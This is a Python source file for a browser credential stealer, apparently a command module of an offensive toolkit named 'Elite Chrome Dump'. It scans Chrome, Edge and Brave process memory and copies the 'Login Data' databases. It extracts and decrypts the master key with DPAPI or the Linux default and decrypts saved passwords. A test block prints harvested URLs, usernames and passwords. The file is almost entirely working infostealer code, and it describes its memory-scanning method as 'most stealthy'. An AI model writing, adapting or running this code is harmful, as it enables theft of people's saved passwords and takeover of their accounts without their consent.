#!/usr/bin/env python3
"""
Elite Chrome Dump Command - Extract browser credentials from memory and databases
Uses direct memory access and database decryption
"""

import os
import sys
import json
import sqlite3
import base64
import hashlib
import ctypes
from pathlib import Path

def elite_chromedump():
    """
    Extract Chrome passwords using multiple methods:
    - Chrome process memory scanning
    - Login Data database decryption
    - Local State key extraction
    - Cross-platform support
    """
    
    try:
        # Method 1: Try memory extraction first (most stealthy)
        memory_passwords = _extract_from_chrome_memory()
        
        # Method 2: Database extraction
        db_passwords = _extract_from_chrome_database()
        
        # Combine results and deduplicate
        all_passwords = []
        seen = set()
        
        for pwd_list in [memory_passwords, db_passwords]:
            for pwd in pwd_list:
                key = (pwd.get('url', ''), pwd.get('username', ''))
                if key not in seen:
                    seen.add(key)
                    all_passwords.append(pwd)
        
        return {
            "success": True,
            "method": "memory_and_database",
            "password_count": len(all_passwords),
            "memory_count": len(memory_passwords),
            "database_count": len(db_passwords),
            "passwords": all_passwords
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "passwords": []
        }

def _extract_from_chrome_memory():
    """Extract passwords from Chrome process memory"""
    passwords = []
    
    try:
        # Find Chrome processes
        chrome_pids = _find_chrome_processes()
        
        for pid in chrome_pids:
            try:
                proc_passwords = _scan_process_memory(pid)
                passwords.extend(proc_passwords)
            except Exception as e:
                print(f"Failed to scan PID {pid}: {e}")
                continue
        
    except Exception as e:
        print(f"Memory extraction failed: {e}")
    
    return passwords

def _find_chrome_processes():
    """Find Chrome process PIDs"""
    pids = []
    
    if os.name == 'nt':
        # Windows: Use NtQuerySystemInformation
        pids = _find_chrome_processes_windows()
    else:
        # Unix: Use /proc
        pids = _find_chrome_processes_unix()
    
    return pids

def _find_chrome_processes_windows():
    """Find Chrome processes on Windows"""
    ntdll = ctypes.windll.ntdll
    pids = []
    
    try:
        # Use NtQuerySystemInformation
        info_class = 5  # SystemProcessInformation
        buffer_size = 1024 * 1024
        
        while True:
            buffer = ctypes.create_string_buffer(buffer_size)
            return_length = ctypes.c_ulong()
            
            status = ntdll.NtQuerySystemInformation(
                info_class, buffer, buffer_size, ctypes.byref(return_length)
            )
            
            if status == 0:
                break
            elif status == 0xC0000004:
                buffer_size = return_length.value
                continue
            else:
                break
        
        # Parse process list
        offset = 0
        while True:
            try:
                import struct
                
                next_offset = struct.unpack('<I', buffer[offset:offset+4])[0]
                pid_offset = offset + 68
                pid = struct.unpack('<Q', buffer[pid_offset:pid_offset+8])[0]
                
                # Get process name
                name_length_offset = offset + 60
                name_length = struct.unpack('<H', buffer[name_length_offset:name_length_offset+2])[0]
                
                if name_length > 0:
                    name_offset = offset + 232
                    if name_offset + name_length <= len(buffer):
                        try:
                            process_name = buffer[name_offset:name_offset+name_length].decode('utf-16le', errors='ignore')
                            process_name = process_name.rstrip('\x00').lower()
                            
                            if any(chrome in process_name for chrome in ['chrome.exe', 'msedge.exe', 'brave.exe']):
                                pids.append(int(pid))
                        except:
                            pass
                
                if next_offset == 0:
                    break
                offset += next_offset
                
            except:
                break
    
    except Exception as e:
        print(f"Windows Chrome process search failed: {e}")
    
    return pids

def _find_chrome_processes_unix():
    """Find Chrome processes on Unix"""
    pids = []
    
    try:
        for pid_dir in os.listdir('/proc'):
            if not pid_dir.isdigit():
                continue
            
            try:
                with open(f'/proc/{pid_dir}/comm', 'r') as f:
                    name = f.read().strip().lower()
                
                if any(chrome in name for chrome in ['chrome', 'chromium', 'brave']):
                    pids.append(int(pid_dir))
                    
            except:
                continue
    
    except Exception as e:
        print(f"Unix Chrome process search failed: {e}")
    
    return pids

def _scan_process_memory(pid):
    """Scan process memory for password patterns"""
    passwords = []
    
    if os.name == 'nt':
        passwords = _scan_process_memory_windows(pid)
    else:
        passwords = _scan_process_memory_unix(pid)
    
    return passwords

def _scan_process_memory_windows(pid):
    """Scan Windows process memory"""
    kernel32 = ctypes.windll.kernel32
    passwords = []
    
    # Open process
    PROCESS_VM_READ = 0x0010
    PROCESS_QUERY_INFORMATION = 0x0400
    
    h_process = kernel32.OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid
    )
    
    if not h_process:
        return passwords
    
    try:
        # Get memory regions
        regions = _get_memory_regions_windows(h_process)
        
        for region in regions:
            try:
                # Read memory region
                data = _read_memory_region_windows(h_process, region)
                
                # Search for password patterns
                region_passwords = _search_password_patterns(data)
                passwords.extend(region_passwords)
                
            except:
                continue
    
    finally:
        kernel32.CloseHandle(h_process)
    
    return passwords

def _get_memory_regions_windows(h_process):
    """Get readable memory regions"""
    kernel32 = ctypes.windll.kernel32
    regions = []
    
    # MEMORY_BASIC_INFORMATION structure
    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("BaseAddress", ctypes.c_void_p),
            ("AllocationBase", ctypes.c_void_p),
            ("AllocationProtect", ctypes.c_ulong),
            ("RegionSize", ctypes.c_size_t),
            ("State", ctypes.c_ulong),
            ("Protect", ctypes.c_ulong),
            ("Type", ctypes.c_ulong)
        ]
    
    mbi = MEMORY_BASIC_INFORMATION()
    address = 0
    
    while address < 0x7FFFFFFF:  # User space limit
        size = kernel32.VirtualQueryEx(
            h_process, address, ctypes.byref(mbi), ctypes.sizeof(mbi)
        )
        
        if size == 0:
            break
        
        # Check if region is readable
        PAGE_READABLE = 0x02 | 0x04 | 0x08 | 0x10 | 0x20 | 0x40
        if (mbi.State == 0x1000 and  # MEM_COMMIT
            mbi.Protect & PAGE_READABLE and
            mbi.RegionSize > 0):
            
            regions.append({
                'address': mbi.BaseAddress,
                'size': min(mbi.RegionSize, 1024 * 1024)  # Limit to 1MB per region
            })
        
        address = mbi.BaseAddress + mbi.RegionSize
        
        # Limit number of regions to scan
        if len(regions) > 100:
            break
    
    return regions

def _read_memory_region_windows(h_process, region):
    """Read memory region"""
    kernel32 = ctypes.windll.kernel32
    
    buffer = ctypes.create_string_buffer(region['size'])
    bytes_read = ctypes.c_size_t()
    
    if kernel32.ReadProcessMemory(
        h_process, region['address'], buffer, region['size'], ctypes.byref(bytes_read)
    ):
        return buffer.raw[:bytes_read.value]
    
    return b''

def _scan_process_memory_unix(pid):
    """Scan Unix process memory"""
    passwords = []
    
    try:
        # Read process memory maps
        with open(f'/proc/{pid}/maps', 'r') as f:
            maps = f.readlines()
        
        # Open memory file
        with open(f'/proc/{pid}/mem', 'rb') as mem_file:
            for line in maps:
                try:
                    # Parse memory map line
                    parts = line.split()
                    if len(parts) < 2:
                        continue
                    
                    addr_range = parts[0]
                    perms = parts[1]
                    
                    # Only read readable regions
                    if 'r' not in perms:
                        continue
                    
                    # Parse address range
                    start_addr, end_addr = addr_range.split('-')
                    start_addr = int(start_addr, 16)
                    end_addr = int(end_addr, 16)
                    
                    size = end_addr - start_addr
                    
                    # Limit region size
                    if size > 1024 * 1024:  # 1MB limit
                        continue
                    
                    # Read memory region
                    mem_file.seek(start_addr)
                    data = mem_file.read(size)
                    
                    # Search for password patterns
                    region_passwords = _search_password_patterns(data)
                    passwords.extend(region_passwords)
                    
                except:
                    continue
    
    except Exception as e:
        print(f"Unix memory scan failed: {e}")
    
    return passwords

def _search_password_patterns(data):
    """Search for password patterns in memory data"""
    passwords = []
    
    try:
        # Look for JSON-like structures with password fields
        data_str = data.decode('utf-8', errors='ignore')
        
        # Search for password-related patterns
        patterns = [
            b'"password_value"',
            b'"username_value"',
            b'"origin_url"',
            b'password',
            b'login'
        ]
        
        for pattern in patterns:
            if pattern in data:
                # Try to extract structured data around the pattern
                try:
                    # Find JSON-like structures
                    start_idx = data.find(b'{')
                    while start_idx != -1:
                        end_idx = data.find(b'}', start_idx)
                        if end_idx != -1:
                            json_candidate = data[start_idx:end_idx + 1]
                            try:
                                # Try to parse as JSON
                                json_str = json_candidate.decode('utf-8', errors='ignore')
                                json_obj = json.loads(json_str)
                                
                                # Check if it looks like a password entry
                                if any(key in json_obj for key in ['password_value', 'username_value', 'origin_url']):
                                    passwords.append({
                                        'url': json_obj.get('origin_url', 'Unknown'),
                                        'username': json_obj.get('username_value', 'Unknown'),
                                        'password': json_obj.get('password_value', '[Encrypted]'),
                                        'source': 'memory'
                                    })
                            except:
                                pass
                        
                        start_idx = data.find(b'{', start_idx + 1)
                except:
                    pass
    
    except:
        pass
    
    return passwords

def _extract_from_chrome_database():
    """Extract passwords from Chrome Login Data database"""
    passwords = []
    
    try:
        # Find Chrome profile directories
        profile_dirs = _find_chrome_profiles()
        
        for profile_dir in profile_dirs:
            try:
                profile_passwords = _extract_from_profile(profile_dir)
                passwords.extend(profile_passwords)
            except Exception as e:
                print(f"Failed to extract from {profile_dir}: {e}")
                continue
        
    except Exception as e:
        print(f"Database extraction failed: {e}")
    
    return passwords

def _find_chrome_profiles():
    """Find Chrome profile directories"""
    profile_dirs = []
    
    if os.name == 'nt':
        # Windows paths
        base_paths = [
            os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
            os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data'),
            os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data')
        ]
    else:
        # Unix paths
        home = os.path.expanduser('~')
        base_paths = [
            f'{home}/.config/google-chrome',
            f'{home}/.config/chromium',
            f'{home}/.config/BraveSoftware/Brave-Browser'
        ]
    
    for base_path in base_paths:
        if os.path.exists(base_path):
            # Look for profile directories
            try:
                for item in os.listdir(base_path):
                    item_path = os.path.join(base_path, item)
                    if os.path.isdir(item_path):
                        # Check if it's a profile directory
                        login_data = os.path.join(item_path, 'Login Data')
                        if os.path.exists(login_data):
                            profile_dirs.append(item_path)
            except:
                continue
    
    return profile_dirs

def _extract_from_profile(profile_dir):
    """Extract passwords from a Chrome profile"""
    passwords = []
    
    try:
        login_data_path = os.path.join(profile_dir, 'Login Data')
        local_state_path = os.path.join(os.path.dirname(profile_dir), 'Local State')
        
        if not os.path.exists(login_data_path):
            return passwords
        
        # Get decryption key
        key = _get_chrome_key(local_state_path)
        
        # Copy database to temp location (Chrome locks the original)
        import tempfile
        import shutil
        
        temp_db = tempfile.mktemp(suffix='.db')
        try:
            shutil.copy2(login_data_path, temp_db)
            
            # Extract passwords from database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, username_value, password_value
                FROM logins
            """)
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                
                if encrypted_password:
                    try:
                        # Decrypt password
                        password = _decrypt_chrome_password(encrypted_password, key)
                        
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': password,
                            'source': 'database'
                        })
                    except Exception as e:
                        print(f"Failed to decrypt password for {url}: {e}")
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': '[Decryption Failed]',
                            'source': 'database'
                        })
            
            conn.close()
            
        finally:
            # Clean up temp file
            try:
                os.remove(temp_db)
            except:
                pass
    
    except Exception as e:
        print(f"Profile extraction failed: {e}")
    
    return passwords

def _get_chrome_key(local_state_path):
    """Get Chrome decryption key from Local State"""
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        # Get encrypted key
        encrypted_key = local_state['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key)
        
        # Remove DPAPI prefix
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
        
        if os.name == 'nt':
            # Decrypt using DPAPI
            key = _dpapi_decrypt(encrypted_key)
        else:
            # On Unix, use a default key (Chrome uses hardcoded key)
            key = b'peanuts'  # Chrome's default key on Linux
        
        return key
        
    except Exception as e:
        print(f"Key extraction failed: {e}")
        # Return default key
        return b'peanuts'

def _dpapi_decrypt(encrypted_data):
    """Decrypt data using Windows DPAPI"""
    if os.name != 'nt':
        return b'peanuts'  # Default for non-Windows
    
    try:
        import ctypes.wintypes
        
        # DPAPI structures
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ('cbData', ctypes.wintypes.DWORD),
                ('pbData', ctypes.POINTER(ctypes.c_char))
            ]
        
        crypt32 = ctypes.windll.crypt32
        
        # Prepare input blob
        blob_in = DATA_BLOB()
        blob_in.pbData = ctypes.cast(
            ctypes.c_char_p(encrypted_data),
            ctypes.POINTER(ctypes.c_char)
        )
        blob_in.cbData = len(encrypted_data)
        
        # Prepare output blob
        blob_out = DATA_BLOB()
        
        # Decrypt
        if crypt32.CryptUnprotectData(
            ctypes.byref(blob_in),
            None,
            None,
            None,
            None,
            0,
            ctypes.byref(blob_out)
        ):
            # Extract decrypted data
            decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            
            # Free memory
            kernel32 = ctypes.windll.kernel32
            kernel32.LocalFree(blob_out.pbData)
            
            return decrypted
        
    except Exception as e:
        print(f"DPAPI decryption failed: {e}")
    
    return b'peanuts'  # Fallback

def _decrypt_chrome_password(encrypted_password, key):
    """Decrypt Chrome password"""
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            # AES encryption (newer Chrome versions)
            encrypted_password = encrypted_password[3:]  # Remove version prefix
            
            # Extract IV and encrypted data
            iv = encrypted_password[:12]
            encrypted_data = encrypted_password[12:]
            
            # Decrypt using AES-GCM
            from Crypto.Cipher import AES
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(encrypted_data[:-16])  # Remove auth tag
            
            return decrypted.decode('utf-8', errors='ignore')
        
        else:
            # DPAPI encryption (older Chrome versions)
            if os.name == 'nt':
                return _dpapi_decrypt(encrypted_password).decode('utf-8', errors='ignore')
            else:
                # Simple decryption for Linux
                return encrypted_password.decode('utf-8', errors='ignore')
    
    except Exception as e:
        print(f"Password decryption failed: {e}")
        return '[Decryption Failed]'

if __name__ == "__main__":
    # Test the elite chromedump command
    print("Testing Elite Chrome Dump Command...")
    
    result = elite_chromedump()
    
    if result["success"]:
        print(f"✓ Chrome dump successful!")
        print(f"  Method: {result['method']}")
        print(f"  Total passwords: {result['password_count']}")
        print(f"  From memory: {result['memory_count']}")
        print(f"  From database: {result['database_count']}")
        
        if result['passwords']:
            print("\nSample passwords (first 3):")
            for i, pwd in enumerate(result['passwords'][:3]):
                print(f"  {i+1}. {pwd['url']}")
                print(f"     Username: {pwd['username']}")
                print(f"     Password: {pwd['password'][:10]}{'...' if len(pwd['password']) > 10 else ''}")
                print(f"     Source: {pwd['source']}")
        else:
            print("  No passwords found (Chrome may not be installed or no saved passwords)")
    else:
        print(f"✗ Chrome dump failed: {result['error']}")